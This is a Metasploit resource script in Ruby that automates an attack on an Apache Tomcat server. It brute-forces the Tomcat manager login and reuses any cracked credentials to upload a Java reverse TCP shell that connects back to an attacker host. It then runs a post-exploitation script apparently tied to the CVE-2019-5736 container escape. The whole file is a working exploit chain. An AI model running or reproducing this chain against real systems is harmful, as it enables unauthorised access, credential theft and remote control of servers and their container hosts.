<ruby>
	require "json"

	def initialize_from_json(json_data)
		framework.datastore["TOMCATHOST_20195736"] = json_data["TOMCATHOST_20195736"]
		framework.datastore["TOMCATPORT_20195736"] = json_data["TOMCATPORT_20195736"]
		framework.datastore["LHOST_VM"] = json_data["LHOST_VM"]
	end

	datastore = framework.datastore

	json_file = File.read("config_rc.json")
	json_data = JSON.parse(json_file)
	datastore["WORKSPACE_20195736"] = json_data["WORKSPACE_20195736"]

	#delete workspace with same name
	run_single("workspace -d #{datastore["WORKSPACE_20195736"]}")
	#set workspace to the selected one in config file
	run_single("workspace -a #{datastore["WORKSPACE_20195736"]}")
	print_status "USING WORKSPACE #{datastore["WORKSPACE_20195736"]}"
	initialize_from_json(json_data)

	datastore = framework.datastore
	run_single("use auxiliary/scanner/http/tomcat_mgr_login")
	run_single("set RHOSTS #{datastore["TOMCATHOST_20195736"]}")
	run_single("set LHOST #{datastore["LHOST_VM"]}")
	run_single("set RPORT #{datastore["TOMCATPORT_20195736"]}")
	run_single("set STOP_ON_SUCCESS true")
	run_single("run")

	begin
		cred = framework.db.creds.to_ary.find { |cr| cr.logins[0].host.address == datastore["TOMCATHOST_20195736"] }
	rescue
		print_error("Credential not found")
		return
	end

	run_single("use exploit/multi/http/tomcat_mgr_upload")
	run_single("set payload payload/java/shell/reverse_tcp")
	run_single("set fingerprintcheck false")
	run_single("set HttpUsername #{cred.public}")
	run_single("set HttpPassword #{cred.private}")
	run_single("set RHOSTS #{datastore["TOMCATHOST_20195736"]}")
	run_single("set LHOST #{datastore["LHOST_VM"]}")
	run_single("set RPORT #{datastore["TOMCATPORT_20195736"]}")
	run_single("set AutoRunScript CVE-2019-5736_PostExploitScript.sh")
	run_single("run")
</ruby>
